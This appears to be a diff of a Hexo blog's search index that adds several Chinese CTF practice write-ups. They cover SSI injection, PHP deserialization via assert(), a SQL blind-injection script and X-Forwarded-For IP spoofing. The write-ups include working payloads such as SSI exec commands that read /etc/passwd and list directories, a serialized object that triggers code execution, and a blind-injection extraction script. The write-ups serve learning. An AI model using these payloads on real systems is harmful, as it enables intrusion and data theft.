href="https://blog.csdn.net/whoim_i/article/details/104370532?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161984410316780262525304%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161984410316780262525304&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-104370532.first_rank_v2_pc_rank_v29&utm_term=xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4449">XXE漏洞（XML外部实体注入）</a>  </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test76 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习26——ssi注入漏洞</title>
+      <link href="test75/undefined-undefined.html"/>
+      <url>test75/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这道题是一道ssi注入题，和ssti注入就差了一个字母，这说明它们两个之间还是有一定联系的。   </p><h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>打开题目看到一个登录界面。  </p><p><a href="https://img.imgdb.cn/item/608fa21cd1a9ae528f702a6b.png"><img src="https://img.imgdb.cn/item/608fa21cd1a9ae528f702a6b.png"></a>  </p><p>一般这种登录界面要么是xml外部实体注入，要么是sql注入，先尝试sql注入发现没有用，那么就抓包看一下是不是xml。  </p><p><a href="https://img.imgdb.cn/item/608fa2e3d1a9ae528f7a1daa.png"><img src="https://img.imgdb.cn/item/608fa2e3d1a9ae528f7a1daa.png"></a>  </p><p>发现也不是xml注入的格式，看了别人的wp发现原来要扫一下源码（这个细节总是会忘…），源码为index.php.swp文件。具体如下：  </p><pre><code>&lt;?phpob_start();function get_hash()&#123;    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;    $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times    $content = uniqid().$random;    return sha1($content); &#125;header(&quot;Content-Type: text/html;charset=utf-8&quot;);***if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )&#123;    $admin = &#39;6d0bc1&#39;;    if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;        echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;        $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;        $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);        $text = &#39;        ***        ***        &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;        ***        ***&#39;;        fwrite($shtml,$text);        fclose($shtml);        ***        echo &quot;[!] Header  error ...&quot;;    &#125; else &#123;        echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;&#125;else&#123;***&#125;***?&gt;  </code></pre><p>可以看出这里需要password经过md5加密后的前六位是6d0bc1  </p><pre><code>$admin = &#39;6d0bc1&#39;;if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6))  </code></pre><p>这个可以用脚本破解出来password。  </p><pre><code>import hashlibfor i in range(1, 100000000):res = hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()if res[:6] == &#39;6d0bc1&#39;:    print(i, res)</code></pre><p>得到密码为：2020666或者2305004，我们使用第一个密码在登陆抓包看一下：  </p><p><a href="https://img.imgdb.cn/item/608fa5d2d1a9ae528f9b0e4e.png"><img src="https://img.imgdb.cn/item/608fa5d2d1a9ae528f9b0e4e.png"></a>   </p><p>确实登陆上去了，并且还给了我们一个url地址：  </p><pre><code>public/fee23b26535c365d150e4ba8aa4559a7ff651ca4.shtml  </code></pre><p>我们进入这个界面看一下：  </p><p><a href="https://img.imgdb.cn/item/608fa62fd1a9ae528f9ee32f.png"><img src="https://img.imgdb.cn/item/608fa62fd1a9ae528f9ee32f.png"></a>  </p><p>发现回显的就是我们输入的username的值，这里就要考虑是不是ssti注入，我们进行测试，输入username为{ {7*7} }，然后再使用它新给我们<br>的url地址来访问：  </p><p><a href="https://img.imgdb.cn/item/608fa6a7d1a9ae528fa3f170.png"><img src="https://img.imgdb.cn/item/608fa6a7d1a9ae528fa3f170.png"></a>  </p><p>可以看到，虽然回显，但并没和ssti一样回显49或者其他，说明这道题还不是ssti注入，这里就要学习新的知识点ssi注入了。  </p><h2 id="ssi注入"><a href="#ssi注入" class="headerlink" title="ssi注入"></a>ssi注入</h2><pre><code>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令（这也就说明了为什么每次我们登录后的shtml网址都会发生变化）。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。  SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。  </code></pre><p>以上就是ssi注入的介绍。当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：</p><pre><code>Web 服务器已支持SSI（服务器端包含）Web 应用程序未对对相关SSI关键字做过滤Web 应用程序在返回响应的HTML页面时，嵌入用户输入</code></pre><p>这个嵌入用户输入就和ssti一样了，都是返回了我们输入的内容。简单来说就是我们可以通过输入ssi的语法来执行命令，然后执行的结果会被返回到响应的shtml界面上，也就是我们每次登录后返回给我们的新的shtml文件url地址。  </p><p>ssi注入语法有很多，这里介绍关于命令执行的语法：  </p><pre><code>&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;  </code></pre><p>这道题没有过滤什么字符，我们可以直接使用，如下所示：  </p><pre><code>username=&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;&amp;password=2020666  </code></pre><p>这里要查看上级目录才能看到flag文件的名字：  </p><p><a href="https://img.imgdb.cn/item/608faa90d1a9ae528fd06292.png"><img src="https://img.imgdb.cn/item/608faa90d1a9ae528fd06292.png"></a>  </p><p>返回得到了flag文件名字，接下来就是读取该文件：  </p><pre><code>username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2020666  </code></pre><p><a href="https://img.imgdb.cn/item/608fab1ad1a9ae528fd57c07.png"><img src="https://img.imgdb.cn/item/608fab1ad1a9ae528fd57c07.png"></a>  </p><p>得到flag。  </p><p>总结一下，关于ssi注入其实和之前学过的ssti和xxs都有一些相同之处，都是会在网页上返回我们输入的相关字符，而ssi注入是通过动态页面来返回的，也就是shtml网页，我们输入的ssi语句会在服务器被执行然后会被返回到shmtl上一些信息，如果前端对我们输入的ssi敏感字符过滤不严，并且在返回的web页面上有用户输入的的字符，那么就会造成ssi漏洞。  </p><p>遇到这类题，要先看一下是否存在动态页面，接着看动态页面是否返回我们输入的字符，接着就是测试字符的过滤，最后使用ssi语法来注入。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>ssi注入是一个新的注入知识，这道题可以说是入门的漏洞讲解，以后会遇到更难的，要对这类注入先做一个简单的认识，打好基础。  </p><p>下面是相关学习博客：  </p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844">ssi注入漏洞</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test75 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习25</title>
+      <link href="test74/undefined-undefined.html"/>
+      <url>test74/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这道题也不是很难，算是一个新的小知识点。  </p><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>打开题目，发现什么提示都没有，直接f12.  </p><p><a href="https://img.imgdb.cn/item/608abc78d1a9ae528f295897.png"><img src="https://img.imgdb.cn/item/608abc78d1a9ae528f295897.png"></a>  </p><p>发现有一个界面./time.php?source，访问一下看看：  </p><p><a href="https://img.imgdb.cn/item/608abcc2d1a9ae528f2d6a58.png"><img src="https://img.imgdb.cn/item/608abcc2d1a9ae528f2d6a58.png"></a>  </p><pre><code>&lt;?php#error_reporting(0);class HelloPhp&#123;public $a;public $b;public function __construct()&#123;    $this-&gt;a = &quot;Y-m-d h:i:s&quot;;    $this-&gt;b = &quot;date&quot;;&#125;public function __destruct()&#123;    $a = $this-&gt;a;    $b = $this-&gt;b;    echo $b($a);&#125;</code></pre><p>}<br>    $c = new HelloPhp;</p><pre><code>if(isset($_GET[&#39;source&#39;]))&#123;highlight_file(__FILE__);die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]);</code></pre><p>得到源码，很简单的反序列化题，有一个魔术方法__destruct()，它会在一个元素销毁或更改时执行，我们可以利用它构造我们想要的字符串，我们要利用的是**echo $b($a);**这句代码，一开始的想法很简单，直接让$b=system,$a=’ls’来构造命令执行函数，但是这道题把命令执行函数过滤了，不能使用。  </p><p>这里就有一个小知识，关于php的缺陷函数。  </p><h3 id="Assert-函数"><a href="#Assert-函数" class="headerlink" title="Assert()函数"></a>Assert()函数</h3><p>assert()这个函数在php语言中是用来判断一个表达式是否成立。返回true or false;叫做php断言。  </p><pre><code>例如&lt;?php$s = 123;assert(&quot;is_int($s)&quot;);?&gt;</code></pre><p>从这个例子可以看到字符串参数会被执行，这跟eval()类似。不过eval($code _str)只是执行符合php编码规范的$code _str。<br>assert的用法却更详细一点。  </p><p>而这个如果字符串为php代码，函数同样也会执行，同eval()一样，只不过eval()只执行符合标准的php代码。  </p><p>那么我们就可以使用这个函数来代替system().  </p><p>构造payload：  </p><pre><code>&lt;?phpclass HelloPhp&#123;public $a;public $b;public function __construct()&#123;    $this-&gt;a = &quot;phpinfo()&quot;;    $this-&gt;b = &quot;assert&quot;;&#125;&#125; $c=new HelloPhp;$x=serialize($c);echo $x;?&gt;  </code></pre><p>得到  </p><pre><code>O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;  </code></pre><p>传参给data变量然后get上传，发现成功执行phpinfo()。  </p><p>这道题目的flag就在phpinfo()信息中，不用ls，cat等命令。  </p><p><a href="https://img.imgdb.cn/item/608ac031d1a9ae528f5d51ff.png"><img src="https://img.imgdb.cn/item/608ac031d1a9ae528f5d51ff.png"></a>  </p><p>同样的，缺陷函数还有 Call _user _func()函数，它也可以执行php代码。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题算是让我多了解关于php的一些同样可以执行php代码的函数，可以积累下来。  </p><p>相关博客：  </p><p><a href="https://blog.csdn.net/weixin_39702483/article/details/111198275?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161962566716780357223979%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161962566716780357223979&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111198275.first_rank_v2_pc_rank_v29&utm_term=php+assert()%E5%87%BD%E6%95%B0">assert函数_PHP函数缺陷详解</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test74 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习24</title>
+      <link href="test73/undefined-undefined.html"/>
+      <url>test73/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>这是一道sql盲注题，见的很多了。  </p><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>打开题目，看见登录框   </p><p><a href="https://img.imgdb.cn/item/608ab6b9d1a9ae528fde4c0a.png"><img src="https://img.imgdb.cn/item/608ab6b9d1a9ae528fde4c0a.png"></a>  </p><p>但是不要被这个登录框给骗了，这道题的sql注入点不在这里，因为测试后可以发现这个登录框过滤了很多字符，很难注入。但是题目也提醒我们选择那几个数字来获得flag，我们点击一个数字。  </p><p><a href="https://img.imgdb.cn/item/608ab736d1a9ae528fe3ee6b.png"><img src="https://img.imgdb.cn/item/608ab736d1a9ae528fe3ee6b.png"></a>  </p><p>可以看到url栏里有?id=1字样，那么这里会不会就是真正的注入点呢？  </p><p><a href="https://img.imgdb.cn/item/608ab7ded1a9ae528febeaaa.png"><img src="https://img.imgdb.cn/item/608ab7ded1a9ae528febeaaa.png"></a>  </p><p>发现有报错，结合题目提到sql盲注，直接上盲注脚本。  </p><pre><code>import timeimport requestsurl = &quot;http://53a5f27f-df29-4f58-ae30-b6d3d404f221.node3.buuoj.cn/search.php?id=&quot;result = &#39;&#39;i = 0while True:i = i + 1head = 32tail = 127while head &lt; tail:    mid = (head + tail) &gt;&gt; 1    # payload = &#39;(ascii(substr(database(),%d,1))&gt;%d)&#39; % (i, mid)    # payload = f&#39;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;    # payload = f&#39;(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;F1naI1y&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;    payload = f&#39;(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;i&#125;,1))&gt;&#123;mid&#125;)&#39;    r = requests.get(url + payload)    # print(r.text)    time.sleep(0.1)    if &quot;Click&quot; in r.text:        head = mid + 1    else:        tail = midif head != 32:    result += chr(head)else:    breakprint(result)  </code></pre><p>大佬的脚本，现在自己写脚本的能力还是差。  </p><p>可以看到，这就是一个正常的sql盲注，按照顺序来一个一个爆出数据库名，表名，列名，flag。  </p><p><a href="https://img.imgdb.cn/item/608abaaed1a9ae528f102a43.png"><img src="https://img.imgdb.cn/item/608abaaed1a9ae528f102a43.png"></a>  </p><p>得到flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>sql盲注题原理不难理解，重点是在写脚本，现在我的写脚本能力明显不足，需要加强，争取早日用上自己的脚本！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test73 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日常练习23</title>
+      <link href="test72/undefined-undefined.html"/>
+      <url>test72/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>今天做了一道简单题，收获了一个小细节。  </p><h1 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h1><p>打开题目，发现要我们输入授权码才能获得flag，而授权码只能通过购买才能得到，那么我们就点开购买界面。  </p><p><a href="https://img.imgdb.cn/item/6086cdc7d1a9ae528f7fa8f5.png"><img src="https://img.imgdb.cn/item/6086cdc7d1a9ae528f7fa8f5.png"></a></p><p>界面是一个微信二维码，扫一下会有提示，提示我们查看一下源码。  </p><p>那么我们在最开始界面查一下源码。  </p><p><a href="https://img.imgdb.cn/item/6086ce19d1a9ae528f8437f0.png"><img src="https://img.imgdb.cn/item/6086ce19d1a9ae528f8437f0.png"></a>  </p><p>可以看到授权码是经过md5加密过的，没办法绕过，但是我们也可以看到有一个/flag.php界面，我们可以先打开看一下。  </p><p><a href="https://img.imgdb.cn/item/6086ce73d1a9ae528f893394.png"><img src="https://img.imgdb.cn/item/6086ce73d1a9ae528f893394.png"></a>  </p><p>虽然没有flag，但是给了提示只有购买者和出题人自己能看到flag，并且验证逻辑是后端的，没办法更改，那么我们就可以猜到应该和ip伪造有关，抓包使用xff伪造一下ip。  </p><p>这里就有一个小细节，伪造ip的语句  </p><pre><code>X-Forwarded-For: 127.0.0.1  </code></pre><p>这句话位置不能乱放，比如直接放在最后一行是不行的。他一般放在Accept-Encoding:这句下方，如果随意放那么再发送会请求超时，不知道是不是我软件的版本问题。  </p><p>我们直接伪造ip为127.0.0.1就可以得到flag了。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>简单题，没什么说的，就是考了xff伪造ip。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test72 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>日常练习22——初识nmap命令</title>
       <link href="test71/undefined-undefined.html"/>
       <url>test71/undefined-undefined.html</url>
